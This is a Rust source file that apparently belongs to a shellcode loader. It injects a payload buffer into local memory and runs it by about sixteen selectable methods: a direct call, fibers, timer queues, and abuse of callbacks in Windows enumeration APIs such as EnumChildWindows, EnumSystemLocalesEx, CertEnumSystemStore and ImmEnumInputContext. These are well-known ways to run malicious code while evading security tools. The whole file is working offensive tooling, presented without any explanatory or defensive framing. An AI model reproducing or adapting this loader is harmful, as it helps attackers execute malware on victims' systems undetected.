use std::ffi::c_void;
use rust_syscalls::syscall;
use std::ptr::{null_mut, null};
use std::mem::transmute;

#[cfg(feature = "InjectionDefaultLocal")]
use super::injection::inject_default_local;

// =======================================================================================================
// EXECUTION METHOD: DEFAULT
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteDefault")]
pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                unsafe {
                    let function: extern "C" fn() = std::mem::transmute(base_address);
                    (function)();
                }
                true
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: FIBER
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteFiber")]
use windows::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
    LPFIBER_START_ROUTINE,
};

#[cfg(feature = "ShellcodeExecuteFiber")]
struct Fiber {
    shellcode_fiber_address: *mut c_void,
    primary_fiber_address: *mut c_void,
}

#[cfg(feature = "ShellcodeExecuteFiber")]
impl Drop for Fiber {
    fn drop(&mut self) {
        unsafe {
            if !self.shellcode_fiber_address.is_null() {
                DeleteFiber(self.shellcode_fiber_address);
            }
            if !self.primary_fiber_address.is_null() {
                DeleteFiber(self.primary_fiber_address);
            }
        }
    }
}

#[cfg(feature = "ShellcodeExecuteFiber")]
pub fn shellcode_execute_fiber(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                unsafe {
                    let mut fiber: Fiber = std::mem::zeroed();
                    
                    // Create fiber from shellcode address
                    fiber.shellcode_fiber_address = CreateFiber(
                        0, 
                        std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address), 
                        None
                    );
                    if fiber.shellcode_fiber_address.is_null() {
                        return false;
                    }
                    
                    // Convert current thread to fiber
                    fiber.primary_fiber_address = ConvertThreadToFiber(None);
                    if fiber.primary_fiber_address.is_null() {
                        return false;
                    }

                    // Switch execution to shellcode fiber
                    SwitchToFiber(fiber.shellcode_fiber_address);
                }
                true
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: CreateTimerQueueTimer
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
use windows_sys::Win32::{
    Foundation::GetLastError,
    System::Threading::CreateTimerQueueTimer
};

#[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
fn exec_payload_via_callback_func(start_address: *mut c_void, parameter: Option<*const c_void>) -> Result<(), String> {

    let mut h_timer = null_mut();
    let status = unsafe {
        CreateTimerQueueTimer(
            &mut h_timer,
            null_mut(),
            Some(std::mem::transmute(start_address)),
            parameter.unwrap_or(null()),
            0x00,
            0x00,
            0x00
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
pub fn shellcode_execute_createtimerqueuetimer(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func(base_address, None) {
                    Ok(_) => {
                        // Sleep to allow callback execution
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumChildWindows
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
use windows_sys::Win32::UI::WindowsAndMessaging::EnumChildWindows;

#[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
fn exec_payload_via_callback_func_enumchild(start_address: *mut c_void, parameter: Option<isize>) -> Result<(), String> {
    let status = unsafe { EnumChildWindows(null_mut(), Some(std::mem::transmute(start_address)), parameter.unwrap_or(0)) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
pub fn shellcode_execute_enumchildwindows(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_enumchild(base_address, None) {
                    Ok(_) => {
                        // Sleep to allow callback execution
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumUILanguagesW
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
use windows_sys::Win32::Globalization::{EnumUILanguagesW, MUI_LANGUAGE_NAME};

#[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
fn exec_payload_via_callback_func_enum(start_address: *mut c_void, parameter: Option<isize>) -> Result<(), String> {
    let status = unsafe { EnumUILanguagesW(Some(std::mem::transmute(start_address)), MUI_LANGUAGE_NAME, parameter.unwrap_or(0)) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
pub fn shellcode_execute_enumuilanguages(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_enum(base_address, None) {
                    Ok(_) => {
                        // Sleep to allow callback execution
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: VerifierEnumerateResource
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
use windows_sys::{
    s,
    Win32::{
        Foundation::{GetLastError, ERROR_SUCCESS, HANDLE},
        System::LibraryLoader::{GetProcAddress, LoadLibraryA}
    }
};

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
type VerifierEnumerateResourceType = unsafe extern "system" fn(
    Process: HANDLE,
    Flags: u32,
    ResourceType: u32,
    ResourceCallback: *mut c_void,
    EnumerationContext: *mut c_void
) -> u32;

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
fn exec_payload_via_callback_func_verifier(start_address: *mut c_void) -> Result<(), String> {
    unsafe {
        let h_module = LoadLibraryA(s!("verifier.dll"));
        let VerifierEnumerateResource = match GetProcAddress(h_module, s!("VerifierEnumerateResource")) {
            Some(addr) => std::mem::transmute::<_, VerifierEnumerateResourceType>(addr),
            None => {
                return Err(String::from(""));
            }
        };

        let error_code = VerifierEnumerateResource((-1isize) as HANDLE, 0x00, 0x00, start_address, null_mut());
    }

    Ok(())
}

#[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
pub fn shellcode_execute_verifierenumerate(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_verifier(base_address) {
                    Ok(_) => {
                        // Sleep to allow callback execution
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumDesktopWindows
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
use windows_sys::Win32::System::{
    StationsAndDesktops::{EnumDesktopWindows, GetThreadDesktop},
    Threading::GetCurrentThreadId,
};

#[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
fn exec_payload_via_callback_func_enumdesktop(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumDesktopWindows(
            GetThreadDesktop(GetCurrentThreadId()),
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };

    if success == 0 {
        return Err(String::from(""));
    }

    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
pub fn shellcode_execute_enumdesktopwindows(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_enumdesktop(base_address, None) {
                    Ok(_) => {
                        // Sleep to allow callback execution
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumSystemLocalesEx
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
use windows_sys::Win32::Globalization::{EnumSystemLocalesEx, LOCALE_ALL};

#[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
fn exec_payload_via_callback_func_enumsystemlocales(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        EnumSystemLocalesEx(
            transmute(start_address),
            LOCALE_ALL,
            parameter.unwrap_or(0),
            null_mut(),
        )
    };

    if success == 0 {
        return Err(String::from(""));
    }

    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
pub fn shellcode_execute_enumsystemlocales(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_enumsystemlocales(base_address, None) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: CertEnumSystemStoreLocation 
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
use windows_sys::Win32::Security::Cryptography::CertEnumSystemStoreLocation;

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
fn exec_payload_via_callback_func_certenum(start_address: *mut c_void) -> Result<(), String> {

    let success = unsafe {
        CertEnumSystemStoreLocation(
            0,
            null_mut(),
            transmute(start_address),
        )
    };

    if success == 0 {
        return Err(String::from(""));
    }

    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
pub fn shellcode_execute_certenumsystemstorelocation(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_certenum(base_address) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumWindowStationsW  
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
use windows_sys::Win32::System::StationsAndDesktops::EnumWindowStationsW;

#[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
fn exec_payload_via_callback_func_enumwindowstations(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success: i32 = unsafe {
        EnumWindowStationsW(
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
pub fn shellcode_execute_enumwindowstations(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_enumwindowstations(base_address, None) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumDisplayMonitors   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
use windows_sys::Win32::Graphics::Gdi::EnumDisplayMonitors;

#[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
fn exec_payload_via_callback_func_enumdisplaymonitors(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from("Start address is null"));
    }

    let success = unsafe {
        EnumDisplayMonitors(
            null_mut(),
            null_mut(),
            transmute(start_address),
            0
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
pub fn shellcode_execute_enumdisplaymonitors(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_enumdisplaymonitors(base_address) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: ImageGetDigestStream    
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
use windows_sys::{
    w,
    Win32::{
        Foundation::{CloseHandle, GENERIC_READ},
        Storage::FileSystem::{CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING},
        System::Diagnostics::Debug::{CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, ImageGetDigestStream},
    },
};

#[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
fn exec_payload_via_callback_func_imagegetdigeststream(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from("Start address is null"));
    }

    let h_file = unsafe {
        CreateFileW(
            w!(r"C:\Windows\System32\kernel32.dll"),
            GENERIC_READ,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        )
    };

    let success = unsafe {
        ImageGetDigestStream(
            h_file,
            CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO,
            transmute(start_address),
            null_mut(),
        )
    };

    if success == 0 {
        unsafe { CloseHandle(h_file) };
        return Err(String::from(""));
    }

    unsafe { CloseHandle(h_file) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
pub fn shellcode_execute_imagegetdigeststream(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_imagegetdigeststream(base_address) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: CertEnumSystemStore     
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
use windows_sys::Win32::Security::Cryptography::CertEnumSystemStore;

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
#[repr(u32)]
enum CertSystemStoreFlags {
    CurrentUser = 0x00010000,
}

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
fn exec_payload_via_callback_func_certenumsystemstore(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from("Start address is null"));
    }

    let success = unsafe {
        CertEnumSystemStore(
            CertSystemStoreFlags::CurrentUser as u32,
            null_mut(),
            null_mut(),
            transmute(start_address),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
pub fn shellcode_execute_certenumsystemstore(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_certenumsystemstore(base_address) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumTimeFormatsEx      
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
use windows_sys::Win32::Globalization::{EnumTimeFormatsEx, LOCALE_NAME_SYSTEM_DEFAULT, TIME_NOSECONDS};

#[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
fn exec_payload_via_callback_func_enumtimeformats(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success: i32 = unsafe {
        EnumTimeFormatsEx(
            transmute(start_address),
            LOCALE_NAME_SYSTEM_DEFAULT,
            TIME_NOSECONDS,
            parameter.unwrap_or(0),
        )
    }; 
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
pub fn shellcode_execute_enumtimeformats(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_enumtimeformats(base_address, None) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: CryptEnumOIDInfo       
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
use windows_sys::Win32::Security::Cryptography::CryptEnumOIDInfo;

#[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
fn exec_payload_via_callback_func_cryptenumoidinfo(start_address: *mut c_void) -> Result<(), String> {
    if start_address.is_null() {
        return Err(String::from("Start address is null"));
    }

    let success = unsafe {
        CryptEnumOIDInfo(
            0,
            0,
            null_mut(),
            transmute(start_address)
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
pub fn shellcode_execute_cryptenumoidinfo(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                match exec_payload_via_callback_func_cryptenumoidinfo(base_address) {
                    Ok(_) => {
                        unsafe {
                            windows_sys::Win32::System::Threading::Sleep(5000);
                        }
                        true
                    }
                    Err(_) => false,
                }
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: ImmEnumInputContext       
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
use windows_sys::Win32::{
    UI::Input::Ime::ImmEnumInputContext,
    System::Threading::Sleep,
};

#[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
fn exec_payload_via_callback_func_immenuminputcontext(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success = unsafe {
        ImmEnumInputContext(
            0,
            transmute(start_address),
            parameter.unwrap_or(0)
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
pub fn shellcode_execute_immenuminputcontext(payload: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    use crate::execution::injection::inject_default_local;

    #[cfg(feature = "InjectionDefaultLocal")]
    {
        if let Ok(start_address) = inject_default_local(&payload) {
            let _ = exec_payload_via_callback_func_immenuminputcontext(start_address, None);
            unsafe {
                Sleep(5000);
            }
            true
        } else {
            false
        }
    }
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

